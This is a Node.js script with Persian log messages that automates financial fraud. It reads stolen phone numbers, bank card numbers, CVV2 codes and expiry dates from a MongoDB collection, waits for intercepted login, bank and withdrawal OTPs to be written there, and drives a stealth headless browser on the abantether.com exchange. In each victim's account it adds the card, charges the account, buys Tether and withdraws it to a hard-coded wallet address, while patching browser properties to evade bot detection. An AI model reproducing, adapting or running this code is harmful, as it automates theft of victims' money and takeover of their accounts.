require('dotenv').config();
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const { MongoClient, ObjectId } = require('mongodb');
const chalk = require('chalk');

const MONGODB_URI = process.env.MONGODB_URI;
const WALLET_ADDRESS = process.env.WALLET_ADDRESS || "THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS";
const AMOUNT_IRT = parseInt(process.env.AMOUNT_IRT) || 5000000;
const SITE_URL = "https://abantether.com";

if (!MONGODB_URI) {
  console.log(chalk.red("خطا: MONGODB_URI تنظیم نشده!"));
  process.exit(1);
}

const log = {
  i: (msg) => console.log(chalk.cyan(`[${new Date().toLocaleString('fa-IR')}] ℹ ${msg}`)),
  s: (msg) => console.log(chalk.green.bold(`[${new Date().toLocaleString('fa-IR')}] ✓ ${msg}`)),
  e: (msg) => console.log(chalk.red.bold(`[${new Date().toLocaleString('fa-IR')}] ✗ ${msg}`)),
  w: (msg) => console.log(chalk.yellow(`[${new Date().toLocaleString('fa-IR')}] ⏳ ${msg}`)),
  start: (msg) => console.log(chalk.magenta.bold(`[${new Date().toLocaleString('fa-IR')}] ⚡ ${msg}`)),
  debug: (msg) => console.log(chalk.gray(`[${new Date().toLocaleString('fa-IR')}] 🔍 ${msg}`))
};

let collection;
let lastNoUsersLog = 0;

async function connectDB() {
  const client = new MongoClient(MONGODB_URI);
  await client.connect();
  collection = client.db("ZarrinApp").collection("zarinapp");
  log.s("اتصال به دیتابیس ZarrinApp.zarinapp برقرار شد");
}

function getValue(field) {
  if (field == null) return null;
  if (typeof field === "object") {
    if (field.$numberInt) return parseInt(field.$numberInt);
    if (field.$numberLong) return field.$numberLong.toString();
    if (field.$numberDouble) return parseFloat(field.$numberDouble);
  }
  return field;
}

function isReady(doc) {
  const phone = getValue(doc.personalPhoneNumber);
  const card = getValue(doc.cardNumber);
  const cvv2 = getValue(doc.cvv2);
  const month = getValue(doc.bankMonth);
  const year = getValue(doc.bankYear);
  const device = getValue(doc.deviceId);

  return phone && card && cvv2 && month != null && year != null && device && doc.processed !== true && doc.processing !== true;
}

async function waitForOtp(userId, field, maxWait = 180) {
  for (let i = 0; i < maxWait / 3; i++) {
    const user = await collection.findOne({ _id: new ObjectId(userId) });
    const otp = getValue(user?.[field]);
    if (otp && otp.toString().trim().length >= 4) {
      log.s(`${field} دریافت شد: ${otp}`);
      return otp.toString().trim();
    }
    log.w(`در انتظار ${field}... (${i * 3}s)`);
    await new Promise(r => setTimeout(r, 3000));
  }
  throw new Error(`تایم‌اوت ${field}`);
}

async function clearAndType(page, selector, text) {
  await page.evaluate((sel, txt) => {
    const el = document.querySelector(sel);
    if (el) {
      el.value = '';
      el.focus();
    }
  }, selector);
  await page.type(selector, text, { delay: 100 });
}

async function takeScreenshot(page, name) {
  await page.screenshot({ path: `debug-${name}-${Date.now()}.png`, fullPage: true });
  log.debug(`اسکرین‌شات ذخیره شد: debug-${name}-${Date.now()}.png`);
}

async function findAllInputs(page) {
  return await page.evaluate(() => {
    const inputs = Array.from(document.querySelectorAll('input'));
    return inputs.map(input => ({
      type: input.type,
      name: input.name,
      id: input.id,
      placeholder: input.placeholder,
      className: input.className,
      'data-testid': input.getAttribute('data-testid'),
      outerHTML: input.outerHTML
    }));
  });
}

async function findElementByText(page, text) {
  return await page.evaluate((text) => {
    const elements = Array.from(document.querySelectorAll('*'));
    return elements.filter(el => {
      const elementText = el.textContent || el.innerText;
      return elementText.includes(text);
    }).map(el => ({
      tagName: el.tagName,
      text: el.textContent,
      className: el.className,
      id: el.id,
      outerHTML: el.outerHTML
    }));
  }, text);
}

async function advancedFindAndType(page, text, fieldType = 'phone') {
  // پیدا کردن تمام input ها
  const allInputs = await findAllInputs(page);
  log.debug(`تعداد کل input ها: ${allInputs.length}`);
  
  // لاگ تمام input ها برای دیباگ
  allInputs.forEach((input, index) => {
    log.debug(`Input ${index + 1}: type=${input.type}, name=${input.name}, placeholder=${input.placeholder}, class=${input.className}`);
  });

  // سلکتورهای گسترده‌تر
  const extendedSelectors = [
    // سلکتورهای عمومی
    'input',
    'input[type="text"]',
    'input:not([type="hidden"])',
    
    // سلکتورهای بر اساس placeholder
    'input[placeholder*="موبایل"]',
    'input[placeholder*="شماره"]',
    'input[placeholder*="09"]',
    'input[placeholder*="phone"]',
    'input[placeholder*="mobile"]',
    'input[placeholder*="کد"]',
    'input[placeholder*="رمز"]',
    
    // سلکتورهای بر اساس class
    'input.form-control',
    'input.form-input',
    'input.input-field',
    'input.text-input',
    
    // سلکتورهای خاص
    'input[autocomplete="tel"]',
    'input[inputmode="tel"]',
    'input.tel-input',
    'input[type="number"]'
  ];

  // امتحان کردن تمام سلکتورها
  for (const selector of extendedSelectors) {
    try {
      const elements = await page.$$(selector);
      for (const element of elements) {
        const isVisible = await page.evaluate(el => {
          const style = window.getComputedStyle(el);
          return style && style.display !== 'none' && style.visibility !== 'hidden' && style.opacity !== '0' && el.offsetWidth > 0 && el.offsetHeight > 0;
        }, element);
        
        if (isVisible) {
          const boundingBox = await element.boundingBox();
          if (boundingBox && boundingBox.width > 50 && boundingBox.height > 10) {
            log.i(`فیلد پیدا شد با سلکتور: ${selector}`);
            await element.click({ clickCount: 3 });
            await page.waitForTimeout(500);
            await element.type(text, { delay: 100 });
            log.s(`متن وارد شد: ${text}`);
            return true;
          }
        }
      }
    } catch (e) {
      log.debug(`سلکتور ${selector} ناموفق: ${e.message}`);
    }
  }

  // استفاده از XPath
  const xpathSelectors = [
    '//input[contains(@placeholder, "موبایل")]',
    '//input[contains(@placeholder, "شماره")]',
    '//input[contains(@placeholder, "کد")]',
    '//input[@type="tel"]',
    '//input[@type="number"]',
    '(//input[@type="text"])[1]',
    '//input[not(@type="hidden")][1]'
  ];

  for (const xpath of xpathSelectors) {
    try {
      const elements = await page.$x(xpath);
      if (elements.length > 0) {
        const element = elements[0];
        const isVisible = await page.evaluate(el => {
          const style = window.getComputedStyle(el);
          return style && style.display !== 'none' && style.visibility !== 'hidden' && style.opacity !== '0' && el.offsetWidth > 0 && el.offsetHeight > 0;
        }, element);
        
        if (isVisible) {
          log.i(`فیلد پیدا شد با XPath: ${xpath}`);
          await element.click({ clickCount: 3 });
          await page.waitForTimeout(500);
          await element.type(text, { delay: 100 });
          log.s(`متن وارد شد: ${text}`);
          return true;
        }
      }
    } catch (e) {
      log.debug(`XPath ${xpath} ناموفق: ${e.message}`);
    }
  }

  return false;
}

async function advancedFindAndClick(page, buttonTexts) {
  // پیدا کردن دکمه بر اساس متن با XPath
  for (const text of buttonTexts) {
    try {
      const elements = await page.$x(`//*[contains(text(), "${text}")]`);
      for (const element of elements) {
        const tagName = await page.evaluate(el => el.tagName, element);
        const isVisible = await page.evaluate(el => {
          const style = window.getComputedStyle(el);
          return style && style.display !== 'none' && style.visibility !== 'hidden' && style.opacity !== '0' && el.offsetWidth > 0 && el.offsetHeight > 0;
        }, element);
        
        if (isVisible && ['BUTTON', 'INPUT', 'A', 'DIV', 'SPAN'].includes(tagName)) {
          log.i(`دکمه پیدا شد با متن: ${text}`);
          await element.click();
          return true;
        }
      }
    } catch (e) {
      log.debug(`دکمه با متن ${text} ناموفق: ${e.message}`);
    }
  }

  // پیدا کردن دکمه بر اساس سلکتورهای عمومی
  const buttonSelectors = [
    'button',
    'button[type="submit"]',
    'input[type="submit"]',
    '.btn',
    '.button',
    'a.btn',
    '[role="button"]'
  ];

  for (const selector of buttonSelectors) {
    try {
      const elements = await page.$$(selector);
      for (const element of elements) {
        const isVisible = await page.evaluate(el => {
          const style = window.getComputedStyle(el);
          return style && style.display !== 'none' && style.visibility !== 'hidden' && style.opacity !== '0' && el.offsetWidth > 0 && el.offsetHeight > 0;
        }, element);
        
        if (isVisible) {
          log.i(`دکمه کلیک شد با سلکتور: ${selector}`);
          await element.click();
          return true;
        }
      }
    } catch (e) {
      log.debug(`سلکتور دکمه ${selector} ناموفق: ${e.message}`);
    }
  }

  return false;
}

async function waitForNavigationOrTimeout(page, timeout = 10000) {
  try {
    await Promise.race([
      page.waitForNavigation({ waitUntil: 'networkidle2', timeout }),
      new Promise(resolve => setTimeout(resolve, timeout))
    ]);
  } catch (e) {
    log.debug('Navigation timeout or not needed');
  }
}

async function processUser(doc) {
  const phone = getValue(doc.personalPhoneNumber);
  const card = getValue(doc.cardNumber);
  const cvv2 = getValue(doc.cvv2);
  const month = getValue(doc.bankMonth);
  const year = getValue(doc.bankYear);
  const device = getValue(doc.deviceId);
  let browser = null;

  log.start(`شروع پردازش: ${phone} | ${device}`);

  try {
    await collection.updateOne({ _id: doc._id }, { $set: { processing: true } });

    browser = await puppeteer.launch({
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--no-zygote',
        '--disable-web-security',
        '--disable-features=site-per-process'
      ]
    });

    const page = await browser.newPage();
    
    // تنظیمات صفحه برای شبیه‌سازی موبایل
    await page.setUserAgent("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36");
    await page.setViewport({ width: 390, height: 844, deviceScaleFactor: 3 });
    
    // جلوگیری از تشخیص ربات
    await page.evaluateOnNewDocument(() => {
      Object.defineProperty(navigator, 'webdriver', { get: () => false });
      Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
      Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en', 'fa'] });
    });

    // مرحله 1: ورود به سایت
    log.i("در حال بارگذاری صفحه اصلی...");
    await page.goto(SITE_URL, { 
      waitUntil: "networkidle2", 
      timeout: 60000 
    });
    log.i("صفحه اصلی لود شد");

    // ذخیره اسکرین‌شات از صفحه اصلی
    await takeScreenshot(page, 'main-page-loaded');

    // مرحله 1.1: پیدا کردن و پر کردن فیلد تلفن
    log.i("در حال پیدا کردن فیلد تلفن...");
    if (!await advancedFindAndType(page, phone, 'phone')) {
      await takeScreenshot(page, 'phone-field-not-found');
      throw new Error("فیلد تلفن پیدا نشد");
    }

    // مرحله 1.2: پیدا کردن و کلیک روی دکمه ادامه
    log.i("در حال پیدا کردن دکمه ادامه...");
    if (!await advancedFindAndClick(page, ["ادامه", "ورود", "تأیید", "下一步", "Continue", "Login"])) {
      await takeScreenshot(page, 'continue-button-not-found');
      throw new Error("دکمه ادامه پیدا نشد");
    }

    log.s("شماره تلفن وارد شد و دکمه ادامه کلیک شد");
    await page.waitForTimeout(3000);

    // مرحله 2: دریافت و وارد کردن OTP ورود
    log.i("در انتظار دریافت کد OTP برای ورود...");
    const otpLogin = await waitForOtp(doc._id, "otp_login");
    
    // مرحله 2.1: پیدا کردن فیلد OTP
    log.i("در حال پیدا کردن فیلد OTP...");
    await page.waitForTimeout(5000);
    
    if (!await advancedFindAndType(page, otpLogin, 'otp')) {
      await takeScreenshot(page, 'otp-field-not-found');
      throw new Error("فیلد OTP پیدا نشد");
    }

    // مرحله 2.2: کلیک روی دکمه تأیید OTP
    log.i("در حال پیدا کردن دکمه تأیید OTP...");
    if (!await advancedFindAndClick(page, ["تأیید", "ورود", "Verify", "Confirm", "اعتبار سنجی"])) {
      await takeScreenshot(page, 'verify-button-not-found');
      throw new Error("دکمه تأیید OTP پیدا نشد");
    }

    log.s("ورود با موفقیت انجام شد");
    await page.waitForTimeout(5000);
    await takeScreenshot(page, 'after-login');

    // مرحله 3: رفتن به صفحه پروفایل/کارت‌ها
    log.i("در حال رفتن به صفحه کارت‌ها...");
    
    // تلاش برای پیدا کردن منو
    if (!await advancedFindAndClick(page, ["پروفایل", "کارت‌ها", "Profile", "Cards"])) {
      // اگر منو پیدا نشد، مستقیماً به آدرس برو
      await page.goto(`${SITE_URL}/cards`, { waitUntil: 'networkidle2' });
    }

    await page.waitForTimeout(3000);

    // مرحله 4: افزودن کارت جدید
    log.i("در حال افزودن کارت جدید...");
    
    if (!await advancedFindAndClick(page, ["افزودن کارت", "کارت جدید", "Add Card", "New Card"])) {
      await takeScreenshot(page, 'add-card-button-not-found');
      throw new Error("دکمه افزودن کارت پیدا نشد");
    }

    await page.waitForTimeout(2000);

    // مرحله 4.1: وارد کردن شماره کارت
    log.i("در حال وارد کردن شماره کارت...");
    if (!await advancedFindAndType(page, card, 'card')) {
      await takeScreenshot(page, 'card-number-field-not-found');
      throw new Error("فیلد شماره کارت پیدا نشد");
    }

    // مرحله 4.2: وارد کردن CVV2
    log.i("در حال وارد کردن CVV2...");
    if (!await advancedFindAndType(page, cvv2, 'cvv2')) {
      await takeScreenshot(page, 'cvv2-field-not-found');
      throw new Error("فیلد CVV2 پیدا نشد");
    }

    // مرحله 4.3: وارد کردن تاریخ انقضا
    log.i("در حال وارد کردن تاریخ انقضا...");
    
    // ماه
    if (!await advancedFindAndType(page, month.toString(), 'month')) {
      log.w("فیلد ماه پیدا نشد، استفاده از سلکتور");
      // استفاده از سلکتور برای ماه
      const monthSelectors = ['select[name="month"]', 'input[name="month"]', '#month'];
      for (const selector of monthSelectors) {
        try {
          await page.select(selector, month.toString());
          log.i("ماه وارد شد");
          break;
        } catch (e) {}
      }
    }

    // سال
    if (!await advancedFindAndType(page, year.toString(), 'year')) {
      log.w("فیلد سال پیدا نشد، استفاده از سلکتور");
      // استفاده از سلکتور برای سال
      const yearSelectors = ['select[name="year"]', 'input[name="year"]', '#year'];
      for (const selector of yearSelectors) {
        try {
          await page.select(selector, year.toString());
          log.i("سال وارد شد");
          break;
        } catch (e) {}
      }
    }

    // مرحله 4.4: ثبت کارت
    log.i("در حال ثبت کارت...");
    if (!await advancedFindAndClick(page, ["ثبت کارت", "ذخیره", "Register Card", "Save"])) {
      await takeScreenshot(page, 'register-card-button-not-found');
      throw new Error("دکمه ثبت کارت پیدا نشد");
    }

    log.s("کارت با موفقیت ثبت شد");
    await page.waitForTimeout(5000);

    // مرحله 5: شارژ حساب
    log.i("شروع فرآیند شارژ حساب...");
    
    // رفتن به صفحه شارژ
    if (!await advancedFindAndClick(page, ["شارژ", "افزایش موجودی", "Charge", "Deposit"])) {
      await page.goto(`${SITE_URL}/charge`, { waitUntil: 'networkidle2' });
    }

    await page.waitForTimeout(3000);

    // وارد کردن مبلغ
    log.i("در حال وارد کردن مبلغ شارژ...");
    if (!await advancedFindAndType(page, AMOUNT_IRT.toString(), 'amount')) {
      await takeScreenshot(page, 'amount-field-not-found');
      throw new Error("فیلد مبلغ پیدا نشد");
    }

    // کلیک روی دکمه پرداخت
    log.i("در حال کلیک روی دکمه پرداخت...");
    if (!await advancedFindAndClick(page, ["پرداخت", "شارژ", "Payment", "Pay"])) {
      await takeScreenshot(page, 'payment-button-not-found');
      throw new Error("دکمه پرداخت پیدا نشد");
    }

    // مرحله 6: دریافت و وارد کردن OTP بانک
    log.i("در انتظار دریافت کد OTP بانک...");
    const otpBank = await waitForOtp(doc._id, "otp_bank");
    
    await page.waitForTimeout(5000);

    log.i("در حال وارد کردن OTP بانک...");
    if (!await advancedFindAndType(page, otpBank, 'bank-otp')) {
      await takeScreenshot(page, 'bank-otp-field-not-found');
      throw new Error("فیلد OTP بانک پیدا نشد");
    }

    // تأیید پرداخت
    log.i("در حال تأیید پرداخت...");
    if (!await advancedFindAndClick(page, ["تأیید", "پرداخت", "Confirm", "Verify"])) {
      await takeScreenshot(page, 'confirm-payment-button-not-found');
      throw new Error("دکمه تأیید پرداخت پیدا نشد");
    }

    log.s("شارژ حساب با موفقیت انجام شد");
    await page.waitForTimeout(5000);

    // مرحله 7: خرید تتر
    log.i("شروع فرآیند خرید تتر...");
    
    // رفتن به صفحه خرید
    if (!await advancedFindAndClick(page, ["خرید", "خرید تتر", "Buy", "Purchase"])) {
      await page.goto(`${SITE_URL}/buy`, { waitUntil: 'networkidle2' });
    }

    await page.waitForTimeout(3000);

    // وارد کردن مبلغ خرید
    log.i("در حال وارد کردن مبلغ خرید...");
    const tetherAmount = (AMOUNT_IRT / 100000).toFixed(6);
    if (!await advancedFindAndType(page, tetherAmount, 'buy-amount')) {
      await takeScreenshot(page, 'buy-amount-field-not-found');
      throw new Error("فیلد مبلغ خرید پیدا نشد");
    }

    // کلیک روی دکمه خرید
    log.i("در حال کلیک روی دکمه خرید...");
    if (!await advancedFindAndClick(page, ["خرید", "خرید تتر", "Buy", "Purchase"])) {
      await takeScreenshot(page, 'buy-button-not-found');
      throw new Error("دکمه خرید پیدا نشد");
    }

    log.s("خرید تتر با موفقیت انجام شد");
    await page.waitForTimeout(5000);

    // مرحله 8: برداشت به کیف پول
    log.i("شروع فرآیند برداشت به کیف پول...");
    
    // رفتن به صفحه برداشت
    if (!await advancedFindAndClick(page, ["برداشت", "برداشت تتر", "Withdraw", "Withdrawal"])) {
      await page.goto(`${SITE_URL}/withdraw`, { waitUntil: 'networkidle2' });
    }

    await page.waitForTimeout(3000);

    // وارد کردن آدرس کیف پول
    log.i("در حال وارد کردن آدرس کیف پول...");
    if (!await advancedFindAndType(page, WALLET_ADDRESS, 'wallet')) {
      await takeScreenshot(page, 'wallet-field-not-found');
      throw new Error("فیلد آدرس کیف پول پیدا نشد");
    }

    // وارد کردن مبلغ برداشت
    log.i("در حال وارد کردن مبلغ برداشت...");
    if (!await advancedFindAndType(page, tetherAmount, 'withdraw-amount')) {
      await takeScreenshot(page, 'withdraw-amount-field-not-found');
      throw new Error("فیلد مبلغ برداشت پیدا نشد");
    }

    // کلیک روی دکمه برداشت
    log.i("در حال کلیک روی دکمه برداشت...");
    if (!await advancedFindAndClick(page, ["برداشت", "ثبت درخواست", "Withdraw", "Submit"])) {
      await takeScreenshot(page, 'withdraw-button-not-found');
      throw new Error("دکمه برداشت پیدا نشد");
    }

    // مرحله 9: تأیید برداشت با OTP
    log.i("در انتظار دریافت کد OTP برای برداشت...");
    const otpWithdraw = await waitForOtp(doc._id, "otp_withdraw");
    
    await page.waitForTimeout(5000);

    log.i("در حال وارد کردن OTP برداشت...");
    if (!await advancedFindAndType(page, otpWithdraw, 'withdraw-otp')) {
      await takeScreenshot(page, 'withdraw-otp-field-not-found');
      throw new Error("فیلد OTP برداشت پیدا نشد");
    }

    // تأیید نهایی
    log.i("در حال تأیید نهایی برداشت...");
    if (!await advancedFindAndClick(page, ["تأیید", "برداشت", "Confirm", "Finalize"])) {
      await takeScreenshot(page, 'final-confirm-button-not-found');
      throw new Error("دکمه تأیید نهایی پیدا نشد");
    }

    log.s("برداشت با موفقیت انجام شد");
    await page.waitForTimeout(5000);
    await takeScreenshot(page, 'final-success');

    log.s(`🎉 تمام مراحل با موفقیت انجام شد! تتر در راه است: ${phone}`);
    await collection.updateOne({ _id: doc._id }, { 
      $set: { 
        processed: true, 
        status: "completed", 
        completedAt: new Date(),
        walletAddress: WALLET_ADDRESS,
        amount: AMOUNT_IRT,
        finalResult: "موفقیت آمیز"
      } 
    });

  } catch (err) {
    log.e(`خطا در پردازش ${phone}: ${err.message}`);
    await collection.updateOne({ _id: doc._id }, { 
      $set: { 
        status: "failed", 
        error: err.message,
        failedAt: new Date(),
        finalResult: "ناموفق"
      } 
    });
  } finally {
    if (browser) await browser.close().catch(() => {});
    await collection.updateOne({ _id: doc._id }, { $unset: { processing: "" } });
  }
}

// Polling هر ۱۰ ثانیه
async function startPolling() {
  await connectDB();

  setInterval(async () => {
    try {
      const users = await collection.find({
        processed: { $ne: true },
        processing: { $ne: true }
      }).limit(2).toArray();

      if (users.length === 0) {
        if (Date.now() - lastNoUsersLog > 30000) {
          log.i("در انتظار دیوایس جدید...");
          lastNoUsersLog = Date.now();
        }
        return;
      }

      for (const user of users) {
        if (isReady(user)) {
          await processUser(user);
          await new Promise(r => setTimeout(r, 15000)); // تأخیر ۱۵ ثانیه بین پردازش کاربران
        }
      }
    } catch (err) {
      log.e("Polling error: " + err.message);
    }
  }, 10000);
}

// مدیریت graceful shutdown
process.on('SIGINT', async () => {
  log.i("در حال خروج...");
  process.exit(0);
});

process.on('SIGTERM', async () => {
  log.i("در حال خروج...");
  process.exit(0);
});

startPolling().catch(err => {
  log.e("خطا در شروع برنامه: " + err.message);
  process.exit(1);
});